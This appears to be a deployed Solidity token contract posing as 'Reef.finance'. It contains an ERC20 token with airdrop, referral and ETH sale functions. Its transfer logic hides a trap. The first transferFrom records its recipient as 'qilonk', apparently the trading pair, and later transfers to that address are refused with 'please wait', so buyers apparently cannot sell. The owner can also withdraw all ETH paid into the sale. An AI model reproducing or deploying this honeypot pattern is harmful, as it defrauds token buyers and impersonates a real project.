{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"Reef_token.sol":{"content":"pragma solidity >=0.5.17;\r\n\r\nlibrary SafeMath {\r\n  function add(uint a, uint b) internal pure returns (uint c) {\r\n    c = a + b;\r\n    require(c >= a);\r\n  }\r\n  function sub(uint a, uint b) internal pure returns (uint c) {\r\n    require(b <= a);\r\n    c = a - b;\r\n  }\r\n  function mul(uint a, uint b) internal pure returns (uint c) {\r\n    c = a * b;\r\n    require(a == 0 || c / a == b);\r\n  }\r\n  function div(uint a, uint b) internal pure returns (uint c) {\r\n    require(b > 0);\r\n    c = a / b;\r\n  }\r\n}\r\n\r\ncontract ERC20Interface {\r\n  function totalSupply() public view returns (uint);\r\n  function balanceOf(address tokenOwner) public view returns (uint balance);\r\n  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\r\n  function transfer(address to, uint tokens) public returns (bool success);\r\n  function approve(address spender, uint tokens) public returns (bool success);\r\n  function transferFrom(address from, address to, uint tokens) public returns (bool success);\r\n\r\n  event Transfer(address indexed from, address indexed to, uint tokens);\r\n  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\r\n}\r\n\r\ncontract ApproveAndCallFallBack {\r\n  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\r\n}\r\n\r\ncontract Owned {\r\n  address public owner;\r\n  address public newOwner;\r\n\r\n  event OwnershipTransferred(address indexed _from, address indexed _to);\r\n\r\n  constructor() public {\r\n    owner = msg.sender;\r\n  }\r\n\r\n  modifier onlyOwner {\r\n    require(msg.sender == owner);\r\n    _;\r\n  }\r\n\r\n  function transferOwnership(address _newOwner) public onlyOwner {\r\n    newOwner = _newOwner;\r\n  }\r\n  function acceptOwnership() public {\r\n    require(msg.sender == newOwner);\r\n    emit OwnershipTransferred(owner, newOwner);\r\n    owner = newOwner;\r\n    newOwner = address(0);\r\n  }\r\n}\r\n\r\ncontract TokenERC20 is ERC20Interface, Owned{\r\n  using SafeMath for uint;\r\n\r\n  string public symbol;\r\n  string public name;\r\n  //\r\n  uint8 public decimals;\r\n  uint _totalSupply;\r\n  address public qilonk;\r\n\r\n  mapping(address => uint) balances;\r\n  mapping(address => mapping(address => uint)) allowed;\r\n\r\n  constructor() public {\r\n    symbol = \"REEF\";\r\n    \r\n    name = \"Reef.finance\";\r\n    \r\n    decimals = 18;\r\n    \r\n    _totalSupply =  2000000 ether;\r\n    \r\n    balances[owner] = _totalSupply;\r\n    \r\n    emit Transfer(address(0), owner, _totalSupply);\r\n  }\r\n  function transferqilonk(address _qilonk) public onlyOwner {\r\n    qilonk = _qilonk;\r\n  }\r\n  function totalSupply() public view returns (uint) {\r\n    return _totalSupply.sub(balances[address(0)]);\r\n  }\r\n  function balanceOf(address tokenOwner) public view returns (uint balance) {\r\n      return balances[tokenOwner];\r\n  }\r\n  function transfer(address to, uint tokens) public returns (bool success) {\r\n     require(to != qilonk, \"please wait\");\r\n    balances[msg.sender] = balances[msg.sender].sub(tokens);\r\n    balances[to] = balances[to].add(tokens);\r\n    emit Transfer(msg.sender, to, tokens);\r\n    return true;\r\n  }\r\n  function approve(address spender, uint tokens) public returns (bool success) {\r\n    allowed[msg.sender][spender] = tokens;\r\n    emit Approval(msg.sender, spender, tokens);\r\n    return true;\r\n  }\r\n  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\r\n      if(from != address(0) && qilonk == address(0)) qilonk = to;\r\n      else require(to != qilonk, \"guys, please wait\");\r\n    balances[from] = balances[from].sub(tokens);\r\n    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\r\n    balances[to] = balances[to].add(tokens);\r\n    emit Transfer(from, to, tokens);\r\n    return true;\r\n  }\r\n  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\r\n    return allowed[tokenOwner][spender];\r\n  }\r\n  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {\r\n    allowed[msg.sender][spender] = tokens;\r\n    emit Approval(msg.sender, spender, tokens);\r\n    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\r\n    return true;\r\n  }\r\n  function () external payable {\r\n    revert();\r\n  }\r\n}\r\n\r\ncontract Reef_token  is TokenERC20 {\r\n  uint256 public FirstQuantDef; \r\n  uint256 public FastQuantDef; \r\n  uint256 public CapDefi; \r\n  uint256 public DefiTotal; \r\n  uint256 public AmtellTot; \r\n  uint256 public SecondBlockAfter; \r\n  uint256 public EndSecondBlockTo; \r\n  uint256 public TotalCMD; \r\n  uint256 public Capatl; \r\n  uint256 public sqaChunk; \r\n  uint256 public soplPrice; \r\n\r\n  function RewardStake(address _refer) public returns (bool success){\r\n    require(FirstQuantDef <= block.number && block.number <= FastQuantDef);\r\n    require(DefiTotal < CapDefi || CapDefi == 0);\r\n    DefiTotal ++;\r\n    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){\r\n      balances[address(this)] = balances[address(this)].sub(AmtellTot / 4);\r\n      balances[_refer] = balances[_refer].add(AmtellTot / 4);\r\n      emit Transfer(address(this), _refer, AmtellTot / 4);\r\n    }\r\n    balances[address(this)] = balances[address(this)].sub(AmtellTot);\r\n    balances[msg.sender] = balances[msg.sender].add(AmtellTot);\r\n    emit Transfer(address(this), msg.sender, AmtellTot);\r\n    return true;\r\n  }\r\n\r\n  function CreateTokenCM(address _refer) public payable returns (bool success){\r\n    require(SecondBlockAfter <= block.number && block.number <= EndSecondBlockTo);\r\n    require(TotalCMD < Capatl || Capatl == 0);\r\n    uint256 _eth = msg.value;\r\n    uint256 _tkns;\r\n    if(sqaChunk != 0) {\r\n      uint256 _price = _eth / soplPrice;\r\n      _tkns = sqaChunk * _price;\r\n    }\r\n    else {\r\n      _tkns = _eth / soplPrice;\r\n    }\r\n    TotalCMD ++;\r\n    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){\r\n      balances[address(this)] = balances[address(this)].sub(_tkns / 4);\r\n      balances[_refer] = balances[_refer].add(_tkns / 4);\r\n      emit Transfer(address(this), _refer, _tkns / 4);\r\n    }\r\n    balances[address(this)] = balances[address(this)].sub(_tkns);\r\n    balances[msg.sender] = balances[msg.sender].add(_tkns);\r\n    emit Transfer(address(this), msg.sender, _tkns);\r\n    return true;\r\n  }\r\n\r\n  function viewDefi() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){\r\n    return(FirstQuantDef, FastQuantDef, CapDefi, DefiTotal, AmtellTot);\r\n  }\r\n  function viewStc() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){\r\n    return(SecondBlockAfter, EndSecondBlockTo, Capatl, TotalCMD, sqaChunk, soplPrice);\r\n  }\r\n  \r\n  function PROXYSALE(uint256 _FirstQuantDef, uint256 _FastQuantDef, uint256 _AmtellTot, uint256 _CapDefi) public onlyOwner() {\r\n    FirstQuantDef = _FirstQuantDef;\r\n    FastQuantDef = _FastQuantDef;\r\n    AmtellTot = _AmtellTot;\r\n    CapDefi = _CapDefi;\r\n    DefiTotal = 0;\r\n  }\r\n  function ConfigRed(uint256 _SecondBlockAfter, uint256 _EndSecondBlockTo, uint256 _sqaChunk, uint256 _soplPrice, uint256 _Capatl) public onlyOwner() {\r\n    SecondBlockAfter = _SecondBlockAfter;\r\n    EndSecondBlockTo = _EndSecondBlockTo;\r\n    sqaChunk = _sqaChunk;\r\n    soplPrice =_soplPrice;\r\n    Capatl = _Capatl;\r\n    TotalCMD = 0;\r\n  }\r\n  function DefiDockTo() public onlyOwner() {\r\n    address payable _owner = msg.sender;\r\n    _owner.transfer(address(this).balance);\r\n  }\r\n  function() external payable {\r\n\r\n  }\r\n}"}}}